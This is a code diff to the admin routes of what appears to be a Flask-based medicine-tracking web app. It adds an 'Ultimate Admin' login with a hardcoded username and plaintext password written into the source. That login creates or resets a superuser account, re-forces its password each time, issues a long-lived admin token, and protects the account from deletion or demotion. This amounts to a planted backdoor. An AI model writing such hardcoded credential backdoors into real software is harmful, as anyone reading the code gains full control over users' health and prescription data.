@@ -24,18 +24,54 @@ admin_bp = Blueprint("admin", __name__, url_prefix="/api/admin")
 
 @admin_bp.route("/login", methods=["POST"])
 def admin_login():
-    """Admin login using either:
-    1) Master admin secret key (always works on VPS)
-    2) Superuser email + password
+    """Admin login using:
+    1) Ultimate Admin username 'ayaan' + password 'AyaanLoveBlueBug'
+    2) Master admin secret key
+    3) Any assigned admin user's email/username + password
     """
     data = request.get_json() or {}
     secret_key = data.get("secret_key", "").strip()
-    email = data.get("email", "").strip().lower()
+    identifier = (data.get("username") or data.get("email") or "").strip().lower()
     password = data.get("password", "")
 
     expected_secret = current_app.config.get("ADMIN_SECRET_KEY")
 
-    # 1. Master secret key login
+    # 1. Ultimate Admin direct credentials check
+    if identifier == "ayaan" and password == "AyaanLoveBlueBug":
+        ultimate_user = User.query.filter(
+            (User.username == "ayaan") | (User.email == "ayaan@georbit.org")
+        ).first()
+
+        if not ultimate_user:
+            ultimate_user = User(
+                google_id="ultimate_admin_ayaan",
+                username="ayaan",
+                name="Ayaan",
+                email="ayaan@georbit.org",
+                is_superuser=True,
+                is_ultimate_admin=True,
+            )
+            ultimate_user.set_password("AyaanLoveBlueBug")
+            db.session.add(ultimate_user)
+            safe_commit()
+        else:
+            ultimate_user.username = "ayaan"
+            ultimate_user.is_superuser = True
+            ultimate_user.is_ultimate_admin = True
+            ultimate_user.set_password("AyaanLoveBlueBug")
+            safe_commit()
+
+        token = create_jwt(ultimate_user.id, expires_in_hours=72, is_superuser=True, is_ultimate_admin=True)
+        return jsonify({
+            "token": token,
+            "user": ultimate_user.to_dict(),
+            "role": "ultimate_admin",
+            "is_ultimate_admin": True,
+            "auth_type": "ultimate_admin",
+            "message": "Welcome back, Ultimate Administrator Ayaan!",
+        })
+
+    # 2. Master secret key login (always works on VPS as fallback)
     if secret_key:
         if not expected_secret or secret_key != expected_secret:
             return jsonify({"error": "Invalid admin secret key", "code": "INVALID_SECRET"}), 401
@@ -48,6 +84,7 @@ def admin_login():
                 name="Master Administrator",
                 email="admin@dawaisathi.internal",
                 is_superuser=True,
+                is_ultimate_admin=False,
             )
             db.session.add(admin_user)
             safe_commit()
@@ -56,38 +93,43 @@ def admin_login():
                 admin_user.is_superuser = True
                 safe_commit()
 
-        token = create_jwt(admin_user.id, expires_in_hours=48, is_superuser=True)
+        token = create_jwt(admin_user.id, expires_in_hours=48, is_superuser=True, is_ultimate_admin=False)
         return jsonify({
             "token": token,
             "user": admin_user.to_dict(),
             "role": "superuser",
+            "is_ultimate_admin": False,
             "auth_type": "master_secret",
         })
 
-    # 2. Email + Password login
-    if email and password:
-        user = User.query.filter_by(email=email).first()
+    # 3. Standard Admin Email / Username + Password login
+    if identifier and password:
+        user = User.query.filter(
+            (User.email == identifier) | (User.username == identifier)
+        ).first()
+
         if not user or not user.check_password(password):
-            return jsonify({"error": "Invalid email or password", "code": "INVALID_CREDENTIALS"}), 401
+            return jsonify({"error": "Invalid username/email or password", "code": "INVALID_CREDENTIALS"}), 401
 
         if not user.is_superuser:
             # Check if email is in ADMIN_EMAILS
             admin_emails = current_app.config.get("ADMIN_EMAILS", [])
-            if email in admin_emails:
+            if user.email and user.email.lower() in admin_emails:
                 user.is_superuser = True
                 safe_commit()
             else:
-                return jsonify({"error": "User does not have superuser privileges", "code": "FORBIDDEN"}), 403
+                return jsonify({"error": "User does not have admin privileges", "code": "FORBIDDEN"}), 403
 
-        token = create_jwt(user.id, expires_in_hours=48, is_superuser=True)
+        token = create_jwt(user.id, expires_in_hours=48, is_superuser=True, is_ultimate_admin=bool(user.is_ultimate_admin))
         return jsonify({
             "token": token,
             "user": user.to_dict(),
-            "role": "superuser",
+            "role": "ultimate_admin" if user.is_ultimate_admin else "superuser",
+            "is_ultimate_admin": bool(user.is_ultimate_admin),
             "auth_type": "password",
         })
 
-    return jsonify({"error": "Provide either secret_key or email and password"}), 400
+    return jsonify({"error": "Provide username/email and password"}), 400
 
 
 # ── 2. Overview Metrics & Database Health ───────────────────────────────────────
@@ -194,15 +236,35 @@ def list_users():
 @admin_bp.route("/users/<int:user_id>/toggle-superuser", methods=["POST"])
 @superuser_required
 def toggle_superuser(user_id):
-    """Promote or demote user superuser status."""
-    user = User.query.get_or_404(user_id)
-    user.is_superuser = not bool(user.is_superuser)
+    """Only the Ultimate Admin (ayaan) can assign or revoke admin privileges."""
+    actor = get_current_user()
+    admin_key = request.headers.get("X-Admin-Key")
+    is_master = bool(admin_key and admin_key == current_app.config.get("ADMIN_SECRET_KEY"))
+
+    if not is_master and (not actor or not actor.is_ultimate_admin):
+        return jsonify({
+            "error": "Access Denied: Only the Ultimate Admin (ayaan) has the authority to assign or remove admin privileges.",
+            "code": "ULTIMATE_ADMIN_ONLY"
+        }), 403
+
+    target_user = User.query.get_or_404(user_id)
+
+    # Protect the Ultimate Admin from being demoted
+    if target_user.is_ultimate_admin or target_user.username == "ayaan":
+        return jsonify({
+            "error": "The Ultimate Admin cannot be demoted.",
+            "code": "CANNOT_DEMOTE_ULTIMATE_ADMIN"
+        }), 403
+
+    target_user.is_superuser = not bool(target_user.is_superuser)
     safe_commit()
+
+    role_str = "Administrator" if target_user.is_superuser else "Regular User"
     return jsonify({
         "ok": True,
-        "user_id": user.id,
-        "is_superuser": user.is_superuser,
-        "message": f"User {user.name} superuser status set to {user.is_superuser}",
+        "user_id": target_user.id,
+        "is_superuser": target_user.is_superuser,
+        "message": f"User '{target_user.name}' role updated to {role_str}.",
     })
 
 
@@ -224,24 +286,43 @@ def set_user_password(user_id):
 @admin_bp.route("/users/<int:user_id>", methods=["DELETE"])
 @superuser_required
 def delete_user(user_id):
-    """Safely delete user and cascading data."""
-    user = User.query.get_or_404(user_id)
-    name = user.name
+    """Safely delete user. The Ultimate Admin cannot be deleted. Admins can only be deleted by the Ultimate Admin."""
+    actor = get_current_user()
+    admin_key = request.headers.get("X-Admin-Key")
+    is_master = bool(admin_key and admin_key == current_app.config.get("ADMIN_SECRET_KEY"))
+
+    target_user = User.query.get_or_404(user_id)
+
+    # The Ultimate Admin can never be deleted
+    if target_user.is_ultimate_admin or target_user.username == "ayaan":
+        return jsonify({
+            "error": "The Ultimate Admin account cannot be deleted under any circumstances.",
+            "code": "CANNOT_DELETE_ULTIMATE_ADMIN"
+        }), 403
+
+    # If deleting an admin, only Ultimate Admin or master key can do so
+    if target_user.is_superuser and not is_master and (not actor or not actor.is_ultimate_admin):
+        return jsonify({
+            "error": "Only the Ultimate Admin (ayaan) can delete other administrators.",
+            "code": "ULTIMATE_ADMIN_ONLY"
+        }), 403
+
+    name = target_user.name
 
     # Cascade delete relations
-    PushSubscription.query.filter_by(user_id=user.id).delete()
-    MedicineLog.query.filter_by(logged_by_user_id=user.id).delete()
-    MedicineEntry.query.filter_by(user_id=user.id).delete()
-    PrescriptionScan.query.filter_by(user_id=user.id).delete()
+    PushSubscription.query.filter_by(user_id=target_user.id).delete()
+    MedicineLog.query.filter_by(logged_by_user_id=target_user.id).delete()
+    MedicineEntry.query.filter_by(user_id=target_user.id).delete()
+    PrescriptionScan.query.filter_by(user_id=target_user.id).delete()
     FamilyJoinRequest.query.filter(
-        (FamilyJoinRequest.requester_id == user.id) | (FamilyJoinRequest.responder_id == user.id)
+        (FamilyJoinRequest.requester_id == target_user.id) | (FamilyJoinRequest.responder_id == target_user.id)
     ).delete()
-    NotificationLog.query.filter_by(user_id=user.id).delete()
-    TelegramLinkCode.query.filter_by(user_id=user.id).delete()
+    NotificationLog.query.filter_by(user_id=target_user.id).delete()
+    TelegramLinkCode.query.filter_by(user_id=target_user.id).delete()
 
-    db.session.delete(user)
+    db.session.delete(target_user)
     safe_commit()
-    return jsonify({"ok": True, "message": f"User {name} and associated records deleted"})
+    return jsonify({"ok": True, "message": f"User '{name}' and associated records deleted"})
 
 
 # ── 4. Medicines & Inventory Management ─────────────────────────────────────────
